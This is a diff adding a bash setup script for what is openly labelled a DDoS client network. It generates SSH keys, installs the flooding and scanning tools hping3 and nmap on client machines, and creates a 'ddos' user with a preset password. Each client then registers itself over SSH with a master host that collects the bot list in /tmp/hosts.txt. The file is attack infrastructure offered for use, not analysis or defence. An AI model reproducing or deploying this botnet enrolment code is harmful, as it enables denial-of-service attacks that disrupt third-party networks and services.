@@ -1,0 +1,52 @@
+#!/bin/bash
+
+if [ -f ~/.ssh/id_rsa.pub ]
+then
+	echo "OK."
+else
+	echo -e "直接回车\n"
+	ssh-keygen -t rsa << EOF
+
+y
+EOF
+	ssh-add ~/.ssh/id_rsa
+fi
+
+master=$(sed -n "4p" config.txt|awk '{print $1}')
+pswd=$(sed -n "2p" config.txt|awk '{print $1}')
+
+rm install-client
+
+cat > install-client << EOF_INSTALL
+#!/bin/bash
+
+if [ -z \$1 ]
+then
+	echo -e "Usage: install clientIP"
+	echo -e "Example:\n\tinstall 192.168.1.124"
+	exit 0
+fi
+
+if [ \$UID != 0 ]
+then
+	echo -e "You need to be root.\n"
+	exit
+fi
+
+apt-get install -y hping3 nmap
+useradd -d /opt/ddos ddos
+mkdir /opt/ddos
+chown ddos.ddos /opt/ddos
+passwd ddos << EOF
+$pswd
+$pswd
+EOF
+
+cur=ddos@\$1
+ssh $master "echo \$cur >> /tmp/hosts.txt; addhost"
+
+EOF_INSTALL
+
+cat src/install-template >> install-client
+
+chmod +x install-client
